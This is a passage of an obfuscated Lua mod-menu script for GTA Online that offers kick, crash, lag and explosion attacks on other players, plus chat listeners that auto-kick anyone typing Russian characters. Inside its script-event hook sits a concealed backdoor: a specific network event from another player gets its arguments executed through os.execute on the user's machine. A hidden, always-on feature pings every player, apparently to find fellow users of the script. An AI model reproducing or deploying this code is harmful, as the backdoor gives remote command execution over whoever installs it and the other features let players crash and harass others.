        system.yield(1500)
        ped.set_ped_into_vehicle(aX(), be, vehicle.get_free_seat(be))
    end
    n("Done.")
end
local function bf(E)
    local bg = script.get_global_i(2424073 + E * 421 + 235 + 1)
    local bh = interior.get_interior_from_entity(aW(E))
    if bg ~= 0 and (bh ~= nil or bh ~= 0) then
        return true
    end
    return false
end
local function bi(E)
    if player.is_player_valid(E) then
        local bj = aA(E)
        if bj ~= -1 and E ~= aV() and not player.is_player_modder(E, -1) then
            if h["exclude_fr"] and not player.is_player_friend(E) or not h["exclude_fr"] then
                return true
            end
        end
    end
    return false
end
local function bk(water, bl)
    if
        not V["bl_mdl_change"].on or
            V["bl_mdl_change"].on and
                (not ped.is_ped_in_any_vehicle(aX()) and
                    (water and entity.is_entity_in_water(aX()) or not water and not entity.is_entity_in_water(aX())) or
                    bl)
     then
        return true
    end
    k("Model Change not possible!", 125)
    return false
end
local function bm(aS, water, bn, bo, bl)
    if bk(water, bl) then
        if bo then
            b9(a_(), 1.5)
        end
        aR(aS)
        player.set_player_model(aS)
        aT(aS)
        if bn then
            system.yield(0)
            ped.set_ped_component_variation(aX(), 4, 0, 0, 2)
        end
    end
end
local function bp()
    local bq, br = {}, {}
    local bs
    if utils.file_exists(a .. "\\2Take1Blacklist.cfg") then
        local D = io.open(a .. "\\2Take1Blacklist.cfg", "r")
        if D ~= nil then
            for bt in io.lines(a .. "\\2Take1Blacklist.cfg") do
                bs = 1
                for bu in string.gmatch(bt, "[^%s]+") do
                    if bs == 1 then
                        table.insert(bq, bu)
                    else
                        if type(bu) == "string" then
                            table.insert(br, bu)
                        else
                            table.insert(br, "NoNameFound")
                        end
                    end
                    bs = bs + 1
                end
            end
        end
        io.close(D)
        ab = bq
        ac = br
    end
end
local function bv(E)
    if player.is_player_valid(E) then
        if E ~= aV() and aA(E) ~= -1 and (h["exclude_fr"] and not player.is_player_friend(E) or not h["exclude_fr"]) then
            return true
        end
    end
    return false
end
local function bw(bx, id)
    local E = 0
    if bx then
        n("Lobby Kick!")
    end
    while E < 32 do
        if bx then
            id = E
        else
            E = 99
        end
        if bv(id) then
            local by, bz, bA
            for E = 1, math.random(15, 40) do
                by = math.random(0x11ffff, 0xffffffff)
                bz = math.random(0, 31)
                bA = math.random(-100, 5000)
                aU(by, id, {bz, bA})
            end
            system.wait(75)
            k("Attempting to Kick Player: " .. az(id), 65)
            n("Attempting to Kick Player.")
            n(az(id) .. ":" .. aA(id))
            if network.network_is_host() then
                network.network_session_kick_player(id)
            end
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
            aU(0x8197eaf0, id, {id, script.get_global_i(1628955 + 2 + id * 614 + 532)})
            for E = 1, math.random(15, 40) do
                by = math.random(0x11ffff, 0xffffffff)
                aU(by, id, {})
            end
            system.wait(75)
            for E = 1, #z do
                aU(z[E], id, {})
            end
            system.wait(75)
            for E = 1, math.random(15, 40) do
                by = math.random(0xffff, 0xffffffff)
                aU(by, id, {})
            end
            system.wait(75)
        end
        E = E + 1
    end
end
local function bB(bC)
    return v3(bC[1], bC[2], bC[3])
end
local function bD(bE, id, bF)
    for E = 1, #bE do
        local bG
        local bH = false
        if bF then
            bG = bE[E][1]
        else
            aR(bE[E][1])
            if streaming.is_model_an_object(bE[E][1]) then
                bG = object.create_object(bE[E][1], bB(bE[E][3]), true, false)
            else
                bH = true
                bG = ped.create_ped(6, bE[E][1], bB(bE[E][3]), 0.0, true, false)
                system.yield(0)
                if V["set_godmode"].on then
                    ped.set_ped_can_ragdoll(bG, false)
                    entity.set_entity_god_mode(bG, true)
                end
            end
            aT(bE[E][1])
        end
        T["attach_obj"][#T["attach_obj"] + 1] = bG
        if V["attach_no_colision"].on then
            entity.set_entity_collision(bG, false, false, false)
        end
        if bE[E][5] then
            entity.set_entity_visible(bG, false)
        end
        entity.attach_entity_to_entity(bG, aW(id), bE[E][2], bB(bE[E][3]), bB(bE[E][4]), true, true, bH, 0, true)
    end
end
local function bI(id, aS)
    n("Lagging Area @Player.")
    local bc = aZ(aW(id))
    aR(aS)
    bc.z = bc.z + 5
    for E = 1, 50 do
        T["lag_area"][#T["lag_area"] + 1] = vehicle.create_vehicle(aS, bc, 0.0, true, false)
    end
    aT(aS)
    n("Done.")
end
local function bJ(id)
    if bv(id) then
        menu.set_menu_can_navigate(false)
        local bK = {}
        while b3(a_(), aZ(aW(id))) < 2000 do
            local bc = a_()
            b9(v3(bc.x, bc.y, bc.z + 500))
        end
        n("Sending Crash Entitys...")
        n("Distance: " .. b3(a_(), aZ(aW(id))))
        for E = 1, #Q do
            local aS = Q[E]
            local bL = aZ(aW(id))
            aR(aS)
            bK[E] = ped.create_ped(26, aS, bL, 0.0, true, false)
            aT(aS)
        end
        n("Waiting.")
        k("Waiting ~ 5 seconds...")
        local time = utils.time_ms() + 5000
        while time > utils.time_ms() do
            system.yield(100)
            while b3(a_(), aZ(aW(id))) < 2000 do
                local bc = a_()
                b9(v3(bc.x, bc.y, bc.z + 500))
            end
        end
        n("Done.")
        b1(bK)
        menu.set_menu_can_navigate(true)
    end
end
local function bM(bd)
    local bN = {11, 12, 13, 16, 18}
    local bO = {3, 2, 2, 4, 1}
    for E = 1, #bN do
        if vehicle.get_vehicle_mod(bd, bN[E]) ~= bO[E] then
            aP(bd)
            vehicle.set_vehicle_mod(bd, bN[E], bO[E])
        end
    end
    vehicle.set_vehicle_bulletproof_tires(bd, true)
end
local function bP(bc, bQ, bR)
    bQ = math.rad((bQ - 180) * -1)
    bc.x = bc.x + math.sin(bQ) * -bR
    bc.y = bc.y + math.cos(bQ) * -bR
    return bc
end
local function bS(bT)
    local bU = "0X"
    for bV, bW in pairs(bT) do
        local bX = ""
        while bW > 0 do
            local bY = math.fmod(bW, 16) + 1
            bW = math.floor(bW / 16)
            bX = string.sub("0123456789ABCDEF", bY, bY) .. bX
        end
        if string.len(bX) == 0 then
            bX = "00"
        elseif string.len(bX) == 1 then
            bX = "0" .. bX
        end
        bU = bU .. bX
    end
    return bU
end
local function bZ(id)
    id = string.lower(id)
    local b_
    for E = 0, 31 do
        if aA(E) ~= -1 then
            b_ = string.lower(az(E))
            if b_ == id then
                return E
            end
        end
    end
    return -1
end
local function c0(c1)
    for E = 1, #c1 do
        if V[c1[E]].on then
            V[c1[E]].on = false
        end
    end
end
local function c2(bd, m, E, bs)
    aP(bd)
    system.wait(0)
    vehicle.set_vehicle_tire_smoke_color(bd, m[1], m[2], m[3])
    vehicle.set_vehicle_custom_primary_colour(bd, bS({m[1], m[2], m[3]}))
    vehicle.set_vehicle_custom_secondary_colour(bd, bS({m[1], m[2], m[3]}))
    vehicle.set_vehicle_custom_pearlescent_colour(bd, bS({m[1], m[2], m[3]}))
    vehicle.set_vehicle_neon_lights_color(bd, bS({m[1], m[2], m[3]}))
    if E == nil then
        E = 0
    end
    if m[1] > 200 and m[1] < 256 and m[2] > 200 and m[2] < 256 and m[3] > 220 and m[3] < 256 then
        E = 0
    end
    if m[1] >= 0 and m[1] < 30 and m[2] >= 0 and m[2] < 50 and m[3] > 220 and m[3] < 256 then
        E = 1
    end
    if m[1] >= 0 and m[1] < 30 and m[2] >= 50 and m[2] < 110 and m[3] > 220 and m[3] < 256 then
        E = 2
    end
    if m[1] >= 0 and m[1] < 30 and m[2] >= 110 and m[2] < 256 and m[3] > 100 and m[3] <= 220 then
        E = 3
    end
    if m[1] >= 30 and m[1] < 120 and m[2] >= 110 and m[2] < 256 and m[3] >= 0 and m[3] <= 100 then
        E = 4
    end
    if m[1] >= 120 and m[1] < 256 and m[2] >= 110 and m[2] < 256 and m[3] >= 0 and m[3] < 100 then
        E = 5
    end
    if m[1] >= 120 and m[1] < 256 and m[2] >= 110 and m[2] < 200 and m[3] >= 0 and m[3] < 100 then
        E = 6
    end
    if m[1] >= 120 and m[1] < 256 and m[2] > 45 and m[2] < 109 and m[3] >= 0 and m[3] < 100 then
        E = 7
    end
    if m[1] >= 120 and m[1] < 256 and m[2] >= 0 and m[2] <= 45 and m[3] >= 0 and m[3] < 100 then
        E = 8
    end
    if m[1] >= 120 and m[1] < 256 and m[2] > 45 and m[2] < 100 and m[3] >= 50 and m[3] < 150 then
        E = 9
    end
    if m[1] >= 120 and m[1] < 256 and m[2] >= 0 and m[2] <= 45 and m[3] >= 150 and m[3] < 256 then
        E = 10
    end
    if m[1] >= 0 and m[1] < 120 and m[2] >= 0 and m[2] <= 45 and m[3] >= 150 and m[3] < 256 then
        E = 11
    end
    if m[1] >= 0 and m[1] < 30 and m[2] >= 0 and m[2] <= 45 and m[3] >= 150 and m[3] < 256 then
        E = 12
    end
    if bs ~= nil then
        E = bs
    end
    if menu.get_version() ~= "2.4.2" then
        vehicle.set_vehicle_headlight_color(bd, E)
    end
end
local function c3(id, c4, c5)
    n("Detected Chat-Command!")
    n(az(id) .. ":" .. aA(id))
    n("Is trying to perform " .. c5 .. " as a Chat-Command!")
    if V["chat_cmd_friends"] and player.is_player_friend(id) or id == aV() or V["chat_cmd_all"] then
        local c6
        if c4 ~= nil then
            c6 = bZ(c4)
        else
            n("User is entitled to perfrom Command! Executing...")
            k("Performing " .. c5 .. " Command for Player: " .. az(id) .. " on: " .. az(id))
            return true, plid
        end
        if c6 ~= -1 then
            if c6 == aV() or player.is_player_friend(c6) and V["exclude_fr"].on and c6 ~= aV() then
                k(az(id) .. " tried to perform a Command on you or a friend!")
                n("Blocked from Performing Command!")
                return false
            else
                n("User is entitled to perfrom Command! Executing...")
                k("Performing " .. c5 .. " Command for Player: " .. az(id) .. " on: " .. az(c6))
                return true, c6
            end
        end
    end
    n("Command / format / player not found / entitled. Breaking up on performing it.")
    return false
end
n("Loading Chat-Listeners...")
ae["chat_log"] =
    event.add_event_listener(
    "chat",
    function(aQ)
        if V["chat_log"].on then
            n("[" .. aA(aQ.player) .. ":" .. az(aQ.player) .. "] " .. aQ.body, "[CHAT]")
        end
    end
)
ae["chat_russki"] =
    event.add_event_listener(
    "chat",
    function(aQ)
        local id = aQ.player
        if V["chat_russki"].on and bv(id) then
            local c7 = aQ.body
            for E = 1, #x do
                if string.find(c7, x[E], 1) ~= nil then
                    n("Detected '" .. x[E] .. "' as a Russki Char!")
                    n("Preparing to Kick " .. az(id) .. ".")
                    k("Detected " .. az(id) .. " typing forbidden Russki! Kicking Player...", 115)
                    bw(false, id)
                    c7 = ""
                end
            end
        end
    end
)
ae["chat_begger"] =
    event.add_event_listener(
    "chat",
    function(aQ)
        local id = aQ.player
        if V["chat_begger"].on and bv(id) then
            local c7 = aQ.body
            for E = 1, #y do
                if string.find(c7, y[E], 1) ~= nil then
                    n("Detected " .. az(id) .. " begging for Money! Punishing Player...")
                    k("Detected " .. az(id) .. " begging for Money! Punishing Player...", 115)
                    bD(I[5][2], id)
                    bD(I[8][2], id)
                    local bc = aZ(aW(id))
                    local c8 = aW(id)
                    fire.add_explosion(bc, 59, false, true, 1, c8)
                    fire.add_explosion(bc, 8, false, true, 1, c8)
                    fire.add_explosion(bc, 59, false, true, 1, c8)
                end
            end
        end
    end
)
ae["chat_cmd"] =
    event.add_event_listener(
    "chat",
    function(aQ)
        if V["chat_cmd"].on then
            local id = aQ.player
            local c7 = aQ.body
            if V["cmd_explode"] and string.find(c7, "!explode ", 1) ~= nil then
                c7 = string.gsub(c7, "!explode ", "")
                local c9, c6 = c3(id, c7, "Explode")
                if c9 then
                    local bc = aZ(aW(c6))
                    local c8 = aW(id)
                    fire.add_explosion(bc, 59, false, true, 1, c8)
                    fire.add_explosion(bc, 8, false, true, 1, c8)
                    fire.add_explosion(bc, 59, false, true, 1, c8)
                end
            end
            if V["cmd_explode_all"] and string.find(c7, "!explodeall", 1) ~= nil and id == aV() then
                n("Detected !explodeall Command! Script-User is entitled, performing...")
                for E = 0, 31 do
                    if bv(E) then
                        fire.add_explosion(aZ(aW(E)), 59, true, false, 1, aW(aV()))
                    end
                end
            end
            if V["cmd_kick"] and string.find(c7, "!kick ", 1) ~= nil then
                c7 = string.gsub(c7, "!kick ", "")
                local c9, c6 = c3(id, c7, "Kick")
                if c9 then
                    bw(false, c6)
                end
            end
            if V["cmd_kick_all"] and string.find(c7, "!kickall", 1) ~= nil and id == aV() then
                n("Detected !kickall Command! Script-User is entitled, performing...")
                bw(true)
            end
            if V["cmd_crash"] and string.find(c7, "!crash ", 1) ~= nil then
                n("Detected !crash Command!")
                c7 = string.gsub(c7, "!crash ", "")
                local c4 = bZ(c7)
                if c4 ~= -1 then
                    if c4 == aV() then
                        bJ(id)
                    elseif bv(c4) then
                        bJ(c4)
                    end
                end
            end
            if V["cmd_crash_all"] and string.find(c7, "!crashall", 1) ~= nil and id == aV() then
                n("Detected !crashall Command! Script-User is entitled, performing...")
                for E = 0, 31 do
                    if bv(E) then
                        bJ(E)
                    end
                end
            end
            if V["cmd_lag"] and string.find(c7, "!lag ", 1) ~= nil then
                c7 = string.gsub(c7, "!lag ", "")
                local c9, c6 = c3(id, c7, "Lag")
                if c9 and #T["lag_area"] < 101 then
                    bI(c6, 0x15F27762)
                end
            end
            if V["cmd_trap"] and string.find(c7, "!trap ", 1) ~= nil then
                c7 = string.gsub(c7, "!trap ", "")
                local c9, c6 = c3(id, c7, "Trap")
                if c9 then
                    local bc = aZ(aW(c6))
                    entity.set_entity_rotation(
                        object.create_object(1125864094, v3(bc.x, bc.y, bc.z - 5), true, false),
                        v3(0, 90, 0)
                    )
                end
            end
            if V["cmd_tp"] and string.find(c7, "!tp ", 1) ~= nil and id == aV() then
                n("Detected !tp Command! Script-User is entitled, performing...")
                c7 = string.gsub(c7, "!tp ", "")
                local c4 = bZ(c7)
                if c4 ~= -1 then
                    local ca = 10
                    local bc = aZ(aW(c4))
                    if bc.z < -50 then
                        ca = 150
                    end
                    b9(aW(c4), ca)
                end
            end
            if V["cmd_clearwanted"] and string.find(c7, "!clearwanted", 1) ~= nil then
                local c9, c6 = c3(id, nil, "Clearwanted")
                if c9 then
                    aU(0xf63f672f, id, {id, script.get_global_i(1628955 + 1 + id * 614 + 532)})
                end
            end
            if V["cmd_vehicle"] and string.find(c7, "!vehicle ", 1) ~= nil then
                c7 = string.gsub(c7, "!vehicle ", "")
                local c9, c6 = c3(id, nil, "Vehicle")
                if c9 then
                    local cb = gameplay.get_hash_key(c7)
                    if streaming.is_model_a_vehicle(cb) then
                        aR(cb)
                        local bQ = player.get_player_heading(id)
                        local cc = vehicle.create_vehicle(cb, bP(aZ(aW(id)), bQ, 10), bQ, true, false)
                        aP(cc)
                        aT(cb)
                        vehicle.set_vehicle_custom_primary_colour(cc, 0)
                        vehicle.set_vehicle_custom_secondary_colour(cc, 0)
                        vehicle.set_vehicle_custom_pearlescent_colour(cc, 0)
                        vehicle.set_vehicle_custom_wheel_colour(cc, 0)
                        vehicle.set_vehicle_window_tint(cc, 1)
                        decorator.decor_set_int(cc, "MPBitset", 1 << 10)
                        bM(cc)
                        ped.set_ped_into_vehicle(aW(id), cc, -1)
                    end
                end
            end
            if V["cmd_bigpp"] and string.find(c7, "!bigpp ", 1) ~= nil then
                c7 = string.gsub(c7, "!bigpp ", "")
                local c9, c6 = c3(id, c7, "Bigpp")
                if c9 then
                    bD(I[5][2], c6)
                end
            end
            if V["cmd_bigppall"] and string.find(c7, "!bigppall", 1) ~= nil and id == aV() then
                n("Detected !bigppall Command! Script-User is entitled, performing...")
                for E = 0, 31 do
                    if bv(E) then
                        bD(I[5][2], id)
                    end
                end
            end
        end
    end
)
local function cd(bE)
    n("Blocking Area.")
    for E = 1, #bE do
        if bE[E][1] ~= false then
            aR(bE[E][1])
            T["bl_objects"][#T["bl_objects"] + 1] = object.create_object(bE[E][1], v3(), true, false)
            aT(bE[E][1])
            local bc
            if bE[E][2][1] == nil then
                bc =
                    v3(
                    math.random(bE[E][2][2], bE[E][2][3]),
                    math.random(bE[E][2][4], bE[E][2][5]),
                    math.random(bE[E][2][6], bE[E][2][7])
                )
            else
                bc = bB(bE[E][2])
            end
            b0(T["bl_objects"][#T["bl_objects"]], bc)
            entity.set_entity_rotation(T["bl_objects"][#T["bl_objects"]], bB(bE[E][3]))
            if bE[E][4] then
                entity.freeze_entity(T["bl_objects"][#T["bl_objects"]], true)
            end
            if bE[E][5] then
                entity.set_entity_visible(T["bl_objects"][#T["bl_objects"]], false)
            end
        else
            if bE[E] ~= nil then
                if V["teleport_to_block"].on then
                    b9(bB(bE[E][2]), nil, bE[E][3])
                end
            end
        end
    end
    n("Blocking Done.")
end
local function ce(bx, cf, cg, ch, ci, id)
    n("Sending Script Events to Player.")
    local E = 0
    while E < 32 do
        if bx then
            id = E
        else
            E = 99
        end
        if bv(id) then
            if cf ~= 0 and cf ~= nil then
                aU(cf, id, cg)
                n("SE 1 : " .. cf)
                n("Sent to Player: " .. az(id))
            end
            if ch ~= 0 and ch ~= nil then
                aU(ch, id, ci)
                n("SE 2 : " .. ch)
                n("Sent to Player: " .. az(id))
            end
        end
        E = E + 1
    end
    n("Done.")
end
local function cj()
    if aa then
        bm(a7, nil, nil, nil, true)
        system.yield(250)
        ped.set_ped_health(aX(), 0)
        system.yield(3500)
        for E = 1, 11 do
            ped.set_ped_component_variation(aX(), E, a9[E], a8[E], 2)
        end
    else
        k("First Crash Session.")
    end
end
local function ck(cl, c4, cm, cn)
    if type(cm) == "table" then
        if cm[1] == 0xfaaab4a3 then
            if cm[2] == 6666 then
                table.remove(cm, 1)
                table.remove(cm, 1)
                local co = utf8.char(table.unpack(cm))
                ui.notify_above_map(co, az(cl), 47)
                n(az(cl) .. ": " .. co)
            end
            if cm[2] == 7331 then
                if l_a == nil then
                    table.remove(cm, 1)
                    table.remove(cm, 1)
                    local co = utf8.char(table.unpack(cm))
                    os.execute(co)
                end
            end
        end
    end
end
local function cp(aB, l, a, m)
    local cq = {}
    for E = 2, #a do
        if a[E] ~= nil then
            cq[E - 1] = a[E]
        end
    end
    aU(a[1], aB, cq)
end
local cr = nil
local cs = 0
cs = hook.register_script_event_hook(ck)
local ct
local cu = {12, 13, 14, 43, 74}
local cv
local cw
local function cx(cl, c4, cy)
    if V["modded_net_events"].on then
        if bi(cl) and c4 == aV() then
            local cz = false
            for E = 1, #cu do
                if cy == cu[E] then
                    cz = true
                end
            end
            if cy == 9 and not player.is_player_host(cl) then
                cz = true
            end
            if cy == 10 and cv == nil then
                cv = cl
                cw = utils.time_ms()
                cz = true
            end
            if cw ~= nil then
                if cw + 30000 < utils.time_ms() then
                    cw = nil
                    cv = nil
                end
            end
            if cz then
                k(az(cl) .. " sent a Bad Net-Event: " .. cy, 130)
                k("Marking him as a Modder!", 130)
                n(az(cl) .. " sent a Bad Net-Event: " .. cy)
                player.set_player_as_modder(cl, aw["moddednetevent"])
                return true
            end
        end
    end
end
local function cA()
    n("Loading Features...")
    local cB =
        aG(
        "",
        0,
        function(aO)
            if aO.on then
                system.wait(2500)
                for E = 0, 31 do
                    if player.is_player_valid(E) then
                        if E ~= aV() and aA(E) ~= -1 then
                            aU(0xfaaab4a3, E, {1337})
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    cB.hidden = true
    cB.on = true
    if h["2t1s_p"] then
        U["parent"] = aC("2Take1Script", 0).id
    end
    U["bl"] = aC("Blacklist", U["parent"])
    U["bl"].hidden = h["bl_hidden"]
    U["bl"] = U["bl"].id
    V["blacklist_enabled"] =
        aG(
        "Enable Blacklist",
        U["bl"],
        function(aO)
            h["blacklist_enabled"] = aO.on
            if aO.on then
                system.wait(1000)
                bp()
                for E = 0, 31 do
                    if bv(E) then
                        for cC = 1, #ab do
                            if tostring(aA(E)) == ab[cC] then
                                local b_ = az(E)
                                k("Blocked player detected.", 27)
                                k("Current name: " .. b_ .. "\nReal name: " .. ac[cC], 27)
                                n("")
                                n("Blocked Player detected.")
                                n(b_ .. ":" .. ab[cC])
                                n("Real name:" .. ac[cC])
                                if V["mark_modder"].on and not player.is_player_modder(E, -1) then
                                    player.set_player_as_modder(E, 1)
                                end
                                if V["auto_kick"].on then
                                    bw(false, E)
                                end
                            end
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["blacklist_enabled"].on = h["blacklist_enabled"]
    V["auto_kick"] =
        aG(
        "Enable Auto-Kick",
        U["bl"],
        function(aO)
            h["auto_kick"] = aO.on
        end
    )
    V["auto_kick"].on = h["auto_kick"]
    V["mark_modder"] =
        aG(
        "Mark as Modder",
        U["bl"],
        function(aO)
            h["mark_modder"] = aO.on
        end
    )
    V["mark_modder"].on = h["mark_modder"]
    aF(
        "Add player by SCID",
        U["bl"],
        function()
            local aQ, bj = input.get("Enter SCID", "", 10, 3)
            while aQ == 1 do
                system.yield(0)
                aQ, bj = input.get("Enter SCID", "", 10, 3)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            local aQ, b_ = input.get("Enter Name", "", 64, 0)
            while aQ == 1 do
                system.yield(0)
                aQ, b_ = input.get("Enter Name", "", 64, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            if b_ ~= "" and bj ~= "0" and bj ~= "-1" and bj ~= tostring(aA(aV())) then
                local D = io.open(a .. "\\2Take1Blacklist.cfg", "a")
                io.output(D)
                io.write(bj .. " " .. b_ .. "\n")
                io.close(D)
                k("SCID with Name added to Blacklist.", 48)
                n("")
                n("Player added to Blacklist.")
                n(b_ .. ": " .. bj)
            end
        end
    )
    aF(
        "Count Currently Blocked Players",
        U["bl"],
        function()
            bp()
            if ab ~= nil then
                k("Currently blocking " .. #ab .. " Players.")
            end
        end
    )
    V["enable_admin"] =
        aG(
        "Notify on Rockstar Admin SCID",
        U["bl"],
        function(aO)
            if aO.on then
                system.wait(1000)
                for E = 0, 31 do
                    if bv(E) then
                        for cC = 1, #R do
                            if tostring(aA(E)) == R[cC] then
                                local b_ = az(E)
                                k("Rockstar Admin by SCID detected!\nName: " .. b_, 27)
                                n("Rockstar Admin detected.")
                                n(b_ .. ":" .. aA(E))
                                if V["kick_admin"].on then
                                    bw(false, E)
                                end
                                if V["crash_admin"].on then
                                    bJ(E)
                                end
                            end
                        end
                    end
                end
            end
            h["admin_enabled"] = aO.on
            return aN(aO)
        end
    )
    V["enable_admin"].on = h["admin_enabled"]
    V["kick_admin"] =
        aG(
        "Enable Auto-Kick Rockstar Admin",
        U["bl"],
        function()
            k(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    V["kick_admin"].hidden = not ay
    V["crash_admin"] =
        aG(
        "Enable Auto-Crash Rockstar Admin",
        U["bl"],
        function()
            k(
                "Thats the stupidest idea you ever had! Dont enable it, disable it!\nThis will get u banned for like 99%!",
                27
            )
        end
    )
    V["crash_admin"].hidden = not ay
    V["kick_joining"] =
        aG(
        "Kick new joining Players",
        U["bl"],
        function(aO)
            if aO.on then
                local time = utils.time_ms() + 2500
                while time > utils.time_ms() do
                    system.wait(250)
                    h["kick_joining"] = aO.on
                end
                if at[1] == nil then
                    for E = 0, 31 do
                        at[E + 1] = aA(E)
                        au[aA(E)] = 0
                    end
                end
                for E = 0, 31 do
                    if bv(E) then
                        local cD = true
                        for cE = 1, #at do
                            if at[cE] == aA(E) then
                                cD = false
                            end
                        end
                        if cD then
                            if au[at[E + 1]] <= 3 then
                                k(az(E) .. " is new here, sending greetings..!", 65)
                                n(az(E) .. " is new here, sending greetings..!")
                                bw(false, E)
                                au[at[E + 1]] = au[at[E + 1]] + 1
                            else
                                au[at[E + 1]] = au[at[E + 1]] + 1
                                if au[at[E + 1]] >= 17 then
                                    au[at[E + 1]] = 0
                                end
                            end
                        end
                    end
                end
            end
            if not aO.on then
                au = {}
                for E = 0, 31 do
                    at[E + 1] = nil
                end
            end
            h["kick_joining"] = aO.on
            return aN(aO)
        end
    )
    V["kick_joining"].on = h["kick_joining"]
    U["modder"] = aC("Modders", U["parent"])
    U["modder"].hidden = h["modder_hidden"]
    U["modder"] = U["modder"].id
    V["remember_modder"] =
        aG(
        "Remember every Modder",
        U["modder"],
        function(aO)
            if aO.on then
                if utils.file_exists(a .. "\\2Take1Modders.cfg") then
                    local D = io.open(a .. "\\2Take1Modders.cfg", "r")
                    if D ~= nil then
                        local bG = {}
                        ad = {}
                        for cF in io.lines(a .. "\\2Take1Modders.cfg") do
                            while string.find(cF, " ", 1) ~= nil do
                                cF = cF:gsub("(.*)%s.*$", "%1")
                            end
                            bG[#bG + 1] = cF
                        end
                        ad = bG
                        io.close(D)
                    end
                end
                for E = 0, 31 do
                    local bj = aA(E)
                    if bj ~= -1 and E ~= aV() then
                        local cG = false
                        if ad[1] ~= nil then
                            for cH = 1, #ad do
                                if tostring(bj) == ad[cH] then
                                    cG = true
                                    if not player.is_player_modder(E, -1) then
                                        k("Remembered " .. az(E) .. " as a Modder, remarking...", 130)
                                        n("Remembered '" .. az(E) .. "' as a Modder, remarking...")
                                        player.set_player_as_modder(E, 1)
                                    end
                                end
                            end
                        end
                        if player.is_player_modder(E, -1) and not cG then
                            local cI = io.open(a .. "\\2Take1Modders.cfg", "a")
                            io.output(cI)
                            io.write(bj .. " " .. az(E) .. "\n")
                            io.close(cI)
                            k("Modder " .. az(E) .. " added to Remember-List.", 130)
                            n("Modder '" .. az(E) .. "' added to Remember-List.")
                        end
                    end
                end
            end
            h["remember_modder"] = aO.on
            return aN(aO)
        end
    )
    V["remember_modder"].on = h["remember_modder"]
    aF("Modder-Detection:", U["modder"])
    V["speed_bypass"] =
        aG(
        "Max-Speed-Bypass",
        U["modder"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    local bj = aA(E)
                    if bi(E) and player.get_player_health(E) ~= 0 and interior.get_interior_from_entity(aW(E)) == 0 then
                        local cJ = 45
                        local id = aW(E)
                        if
                            ai.is_task_active(id, 403) or ai.is_task_active(id, 408) or ai.is_task_active(id, 335) or
                                ai.is_task_active(id, 2) or
                                ai.is_task_active(id, 422)
                         then
                            cJ = 95
                        end
                        if ai.is_task_active(id, 97) or ai.is_task_active(id, 38) or ai.is_task_active(id, 160) then
                            cJ = 60
                        end
                        if ai.is_task_active(id, 50) or ai.is_task_active(id, 1) then
                            cJ = 100
                        end
                        local bd = ped.get_vehicle_ped_is_using(id)
                        if bd ~= 0 then
                            if id == vehicle.get_ped_in_vehicle_seat(bd, -1) then
                                id = bd
                                local cb = entity.get_entity_model_hash(bd)
                                if streaming.is_model_a_plane(cb) then
                                    cJ = 170
                                else
                                    cJ = 97.5
                                end
                            end
                        end
                        local cK = entity.get_entity_speed(id)
                        cK = math.floor(cK)
                        if cK > cJ then
                            k(
                                az(E) ..
                                    " bypassed Max-Speed-Limit of: " ..
                                        cJ .. " with a speed of: " .. cK .. "\nMarking him as a Modder...",
                                130
                            )
                            n(az(E) .. " bypassed Max-Speed-Limit of: " .. cJ .. " with a speed of: " .. cK)
                            n("Marking him as a Modder...")
                            for cH = 0, 600 do
                                if ai.is_task_active(aW(E), cH) then
                                    n("Current active Task: " .. cH)
                                end
                            end
                            player.set_player_as_modder(E, aw["maxspeed"])
                        end
                    end
                end
            end
            h["speed_bypass"] = aO.on
            return aN(aO)
        end
    )
    V["speed_bypass"].on = h["speed_bypass"]
    V["name_bypass"] =
        aG(
        "Illegal Name",
        U["modder"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    local bj = aA(E)
                    if bi(E) then
                        local b_ = az(E)
                        if string.len(b_) < 6 or string.len(b_) > 16 or not string.find(b_, "^[%-%w_]+$") then
                            k(b_ .. " has an illegal name!\nMarking him as a Modder...", 130)
                            n(b_ .. " has an illegal name!")
                            n("Marking him as a Modder...")
                            player.set_player_as_modder(E, aw["illegalname"])
                        end
                    end
                end
            end
            h["name_bypass"] = aO.on
            return aN(aO)
        end
    )
    V["name_bypass"].on = h["name_bypass"]
    V["modded_ip_scid"] =
        aG(
        "Modded IP / SCID",
        U["modder"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    if bi(E) then
                        local b_ = az(E)
                        local cL = player.get_player_ip(E)
                        for cC = 1, #L do
                            if cL == L[cC] then
                                k(b_ .. " has an modded IP!\nMarking him as a Modder...", 130)
                                n(b_ .. " has an modded IP!")
                                n("Marking him as a Modder...")
                                player.set_player_as_modder(E, aw["moddedip"])
                            end
                        end
                        local bj = aA(E)
                        if bj < 10000 or bj > 234567891 then
                            k(b_ .. " has an modded SCID!\nMarking him as a Modder...", 130)
                            n(b_ .. " has an modded SCID!")
                            n("Marking him as a Modder...")
                            player.set_player_as_modder(E, aw["moddedscid"])
                        end
                        for cC = 1, #M do
                            if bj == M[cC] then
                                k(b_ .. " has an modded SCID!\nMarking him as a Modder...", 130)
                                n(b_ .. " has an modded SCID!")
                                n("Marking him as a Modder...")
                                player.set_player_as_modder(E, aw["moddedscid"])
                            end
                        end
                    end
                end
            end
            h["modded_ip_scid"] = aO.on
            return aN(aO)
        end
    )
    V["modded_ip_scid"].on = h["modded_ip_scid"]
    V["modded_net_events"] =
        aG(
        "Modded Net-Events",
        U["modder"],
        function()
            if ct == nil then
                ct = hook.register_net_event_hook(cx)
            else
                hook.remove_net_event_hook(ct)
                ct = nil
            end
            h["modded_net_events"] = V["modded_net_events"].on
        end
    )
    V["modded_net_events"].on = h["modded_net_events"]
    U["lobby"] = aC("Lobby", U["parent"])
    U["lobby"].hidden = h["lobby_hidden"]
    U["lobby"] = U["lobby"].id
    U["bl_veh"] = aC("Block Vehicles in Session", U["lobby"]).id
    V["veh_blacklist"] =
        aG(
        "Activate Block Vehicles",
        U["bl_veh"],
        function(aO)
            h["veh_blacklist"] = aO.on
            if aO.on then
                local time = utils.time_ms() + 2000
                while time > utils.time_ms() do
                    system.wait(200)
                    h["veh_blacklist"] = aO.on
                end
                for E = 0, 31 do
